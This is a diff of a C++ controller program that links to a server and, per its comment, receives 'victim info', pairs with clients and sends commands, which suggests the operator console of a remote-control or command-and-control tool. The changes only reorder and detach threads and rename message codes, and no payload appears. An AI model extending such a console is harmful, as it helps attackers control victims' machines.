@@ -1,16 +1,12 @@
-#include <SFML/Network.hpp>
-#include "Mlib/Util/util.hpp"
-#include <iostream>
 #include <thread>
-#include <sstream>
-#include <Windows.h>
 #include "controller.h"
 
 /* possible messages form server:
 c: controller accepted
 n: controller info
 l: victim info
-e: clear clients list
+e: exit
+r: erase clients list
 d: display clients list
 p: paired with 
 */
@@ -41,18 +37,22 @@ int main()
     char buf[1];
     bool connected = false;
 
+    std::thread stayAwake(sendRs, std::ref(ard));
+    stayAwake.detach();
     std::thread connect(connectServer, std::ref(ard), std::ref(connected));
     do {    
         ard.receive(buf, sizeof(buf), size, ip, port);
     } while (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'c');
     connected = true;
-    std::thread stayAwake(sendRs, std::ref(ard));
     connect.join();
 
     std::cout << "started connection with server\n";
     Controller controller(&ard);
     std::thread receive(&Controller::receiveInfo, &controller);
+    receive.detach();
     std::thread input(&Controller::takeCmdInput, &controller);
+    input.detach();
 
-	return controller.controlWindow();
+    int code = controller.controlWindow();
+	return code;
 }	
